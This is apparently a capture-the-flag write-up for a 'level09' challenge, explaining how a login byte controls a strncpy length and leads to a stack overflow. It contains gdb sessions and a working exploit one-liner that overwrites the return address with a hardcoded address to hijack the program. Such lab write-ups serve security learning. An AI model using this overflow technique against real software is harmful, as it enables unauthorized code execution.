# level09
!! The binary is 64 bits !!  
The program waits for two inputs: `login` and `msg`

## Step 1: Understand the program

The two inputs are enter using `fgets`. Then the two inputs are stored in an other locations using two methods:

#### Login input:
The first 41 bytes are stored in a static buffer at `login + 140`

#### Message input:
The second input is copied into a buffer `msg` using `strncpy`. The lenght of the copy is the value stored at the `login[180]`.


## Vulnerability
The `41th bytes` of the `login` input (login + 180) is the length of the `strncpy`. So, we can change the size of `strncpy` of `msg` through the `login` input.

## Go deeper:
Once `set_msg` is called
```console
(gdb) b *set_msg
(gdb) b *set_msg+153
(gdb) r
>: Enter your username
>>: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
(gdb) x/s $rsp+148
0x7fffffffe55c:	 'A' <repeats 41 times>
```

- buffer `login` is at `0x7fffffffe55c`
- size is 41 whereas I entered more characters. (it's the relocation)
---
```console
(gdb) c
>: Msg @Unix-Dude
>>: CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
(gdb) x/s 0x7fffffffe55c-140
0x7fffffffe4d0:	 'C' <repeats 65 times>
```

Good : the second input has been copied in the buffer `msg` at `0x7fffffffe4d0` with the size __65__.

> 'A' == 65 in decimal

## Step 3: Try to segfault

By setting the maximal size to `strncpy` (256). we will try to segfault the program.

```console
(gdb) c
Continuing.
>>: >: Msg sent!

Program received signal SIGSEGV, Segmentation fault.
0x0000000000000000 in ?? ()
```

We don't where the program crashed.

it segfault at offset 200

## Step 4:

## Exploit
```bash
(python -c 'print("a" * 40 + "\xff" + "\n" + 200 * "b" + "\x8c\x48\x55\x55\x55\x55\x00\x00")'; cat) | /home/users/level09/level09
```